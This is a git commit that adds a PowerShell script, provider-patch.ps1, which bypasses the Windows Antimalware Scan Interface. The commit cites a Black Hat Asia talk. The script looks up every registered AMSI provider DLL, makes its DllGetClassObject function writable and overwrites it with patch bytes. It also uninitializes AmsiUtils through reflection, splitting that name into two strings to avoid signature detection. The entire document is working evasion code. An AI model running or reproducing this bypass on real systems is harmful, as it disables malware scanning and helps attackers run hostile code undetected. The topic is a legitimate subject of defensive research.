37f548b277f6cedb4e3be88306a219d498f964d8
RSecure <86128883+R-Secure@users.noreply.github.com>
2022-07-07 13:46:15 +0200

    Created provider-patch.ps1
    Added AMSI bypass by patching the provider as explained in https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf. It checks the available providers on the system and patches them accordingly.

---
+++ provider-patch.ps1
@@ -0,0 +1,36 @@
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+	[DllImport("kernel32")]
+	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+	[DllImport("kernel32")]
+	public static extern IntPtr LoadLibrary(string name);
+
+	[DllImport("kernel32")]
+	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,out uint lpflOldProtect);
+}
+"@
+
+Add-Type $Win32
+
+foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+{
+    $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
+
+    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
+    $dllPath = Get-ItemPropertyValue -Name '(default)' $registry
+    $providerDLL = Split-Path $dllPath -leaf
+    $dll = $providerDLL -replace '"', ""
+  
+    $LoadLibrary = [Win32]::LoadLibrary($dll )
+    $Address = [Win32]::GetProcAddress($LoadLibrary, "DllGetClassObject")
+    $p = 0
+    [Win32]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
+    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
+    $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
+    $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
+    $Uninitialize.Invoke($object,$null)
+}
